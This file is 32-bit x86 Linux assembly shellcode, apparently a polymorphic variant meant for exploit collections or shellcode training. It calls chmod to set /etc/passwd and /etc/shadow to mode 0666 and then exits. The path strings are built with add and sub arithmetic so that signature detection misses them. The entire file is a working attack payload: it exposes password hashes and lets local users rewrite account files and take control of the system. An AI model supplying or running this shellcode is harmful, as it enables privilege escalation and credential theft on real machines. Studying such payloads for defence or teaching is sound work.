;Shellcode size : 83 bytes (40% more)
global _start

_start:
    xor eax, eax                        ;Initialize eax to NULL
    mov cx, 0x1b6                       ;Move 0x1b6 inside cx (666 in octal)
 
    push eax                            ;Push a NULL byte on the stack
    push 0x64777373
    mov edi, 0x2e3cfbfc
    add edi, 0x33333333
    push edi
    mov edi, 0x63746541
    sub edi, 0x12
    push edi                            ;Push "/etc//passwd%00" on the stack
    mov ebx, esp                        ;Initialize ebx to the esp stack pointer

    push 0xf                        
    pop eax                             ;move the systemcall number inside eax
    ;Systemcall details:
    ; --> chmod("/etc/passwd%00", 0666o)
    int 0x80                            ;execute systemcall

    push 0x1
    pop eax
    dec eax                             ;Initialize eax to NULL
    push eax                            ;Push a NULL byte on the stack

    mov edi, 0x443C312E
    add edi, 0x33333333
    push edi
    push 0x68732f2f
    push 0x6374652f                     ;Push "/etc//shadow%00" on the stack        
    mov ebx, esp                        ;Initialize ebx to the esp stack pointer
    
    mov dl, 0xf                         
    xchg al, dl                         ;move the systemcall number inside eax

    ;Systemcall details:
    ; --> chmod("/etc/shadow%00", 0666o)
    int 0x80                            ;execute systemcall


    push 0x1
    pop eax                             ;move the systemcall number inside eax
    mov ebx, eax
    dec ebx                             ;Initialize ebx to 0
    ;Systemcall details:
    ; --> exit(0)
    int 0x80                            ;execute systemcall